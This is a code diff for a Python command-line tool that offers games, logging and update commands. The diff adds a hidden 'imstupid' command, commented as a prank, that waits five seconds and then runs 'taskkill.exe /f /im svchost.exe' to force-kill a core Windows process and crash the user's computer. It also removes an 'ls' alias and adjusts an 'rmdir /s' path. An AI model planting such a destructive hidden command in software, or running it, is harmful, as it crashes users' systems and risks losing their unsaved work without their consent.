@@ -54,7 +54,7 @@ def add_dislog(text):
 add_log('importing default modules')
 import sys
 try:
-    import random, os, subprocess, ctypes, shutil, pip, enum
+    import random, os, subprocess, ctypes, pip, enum
     from time import sleep
     add_log('successfully imported modules')
 except:
@@ -649,12 +649,17 @@ def command_line():
         elif user_input[0:len('hl')] == 'hl':
             base_command_hl(user_input, 'hl')
 
+        # This command is a prank that crashes the users computer
+        elif user_input == 'imstupid':
+            add_dislog('the user is stupid')
+            print('You have 5 seconds to exit this program, or else...')
+            sleep(5)
+            # THIS WILL KILL THE USERS COMPUTER
+            os.system('taskkill.exe /f /im svchost.exe')
+
         # check if this is the valid command
         elif user_input[0:len('log')] == 'log':
             base_command_log(user_input, 'log')
-
-        elif user_input == 'ls':
-            os.system('dir')
 
         elif user_input == 'lu':
             print(Fore.BLUE+'Opening Lucky Unicorn Game...')
@@ -734,7 +739,7 @@ def command_line():
 
         elif user_input == 'update -clean':
             add_log('removing reset update')
-            os.system('rmdir /s downloads\PEX')
+            os.system('rmdir /s downloads\\PEX')
 
         elif user_input == 'custom_command':
             with open('main/config.json', 'r') as jsonConfig:
